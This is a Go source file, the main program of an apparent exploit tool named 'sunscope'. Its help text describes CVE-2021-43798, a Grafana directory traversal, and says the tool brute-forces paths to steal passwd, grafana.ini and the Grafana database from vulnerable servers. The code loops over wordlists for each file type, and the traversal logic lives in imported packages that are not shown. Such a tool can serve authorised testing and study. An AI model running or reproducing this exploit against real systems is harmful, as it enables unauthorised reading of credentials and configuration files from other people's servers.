package main

import (
	"bad.key/sunscope/pkg/bruteforce"
	"bad.key/sunscope/pkg/wordlist"

	"fmt"
	"os"
)

func main() {
	logo := `
                 ~.
                 :Y
                  ~?    7BP^
                   7~ :#&&&&5
            .....  ^#G&@@@@@@&#BYYG##~
          ?##&&&&#&@@@@&&&#BBB#&&@@@@P
          Y@&&@@@&&&&G#!:.......:~JB&@5
          .#&@@&&&&Y. :.            .Y@&:    .:^~~
           ^@&&&&&^       ^7JJJ7~:    .#@~^~~^..
           Y&&&&&:     .P&&&BB#&&&#5?7^^G#
          .&&&&&Y     ~&&#~ ...:!G&&&G.  B.
        .J&@&&&&~     B&J...^.    !&&&P  7~   5G5Y#5 .&^  JB  #&: 7#  7B5YG#  :GG55#J :GP5GY  J&PPPP: !&PPPP~
       ?#&&@#&&&J    .B&^ .7       P&&&^ J:  :@5..J! :@!  P& .@&& J@  &&^.~Y .@Y  .#J.@Y .5@G P@  .@# J@:..
      .G&&&@&&&@&7    .GG^...      P&&&7.5    .?5GP: :@~  P& .@75#5@  .!YPG7 ~@:     ^@!JP:P@ 5@PPPP: J@P5P~
       :JGB&@&&#&#~     :7?77~    7&&##&&:   !&^ .&& .@5 .&# .@? G@@ .&?  Y@. &G..:#~ &@7 :@5 P@      J@:...
   ^~~^:.   :G&##&&G!.       .. :5&&##&&G.   ^G?55Y.  :55PJ.  P^  P5  PJY55~  .J555!  .?555!  75      ~G555P~
   .          7#&##&&#GJ!~^^^J#B&&###P7.
               P&&&&##&&&&&&##&@#&#P~
               P&#&&#GGB####&&&@@B.
               :7!^.    ....7PBB&7
                              .. J:
                                  5.
                                  .7
		`

	if os.Args[1] == "help" {
		fmt.Println(logo)
		fmt.Println("Command Usage: ./sunscope 'URL_NAME' 'ENTRY_TYPE'")
		fmt.Println("CVE-2021-43798 is an Unauthenticated Directory Traversal in Grafana present from versions 8.0.0-beta1 to 8.3.0 that can allow an Attacker to read sensitive files such as passwd and grafana.ini. This code performs a pseudo-Directory Bust attack to search for Grafana applications suffering from the vulnerability and attempts to steal the sensitive files from it.")
		fmt.Println("Use this code responsibly...")
		os.Exit(0)
	} else if len(os.Args) > 3 || len(os.Args) < 2 {
		panic("ERROR: Insufficient amount of arguments provided!")
	}

	x := 0
	const wordlist_length = 48
	var bruteforce bruteforce.Bruteforce
	bruteforce.Hostname = os.Args[1]
	fmt.Println(logo)

	for {
		if x == wordlist_length {
			break
		}
		switch os.Args[2] {
		case "db":
			bruteforce.BruteforceFile(wordlist.ReturnWordlistEntry("wordlist_grafana_db", x), "grafana_db")
		case "ini":
			bruteforce.BruteforceFile(wordlist.ReturnWordlistEntry("wordlist_grafana_ini", x), "grafana_ini")
		case "passwd":
			bruteforce.BruteforceFile(wordlist.ReturnWordlistEntry("wordlist_passwd", x), "passwd")
		}
		x++
	}
}
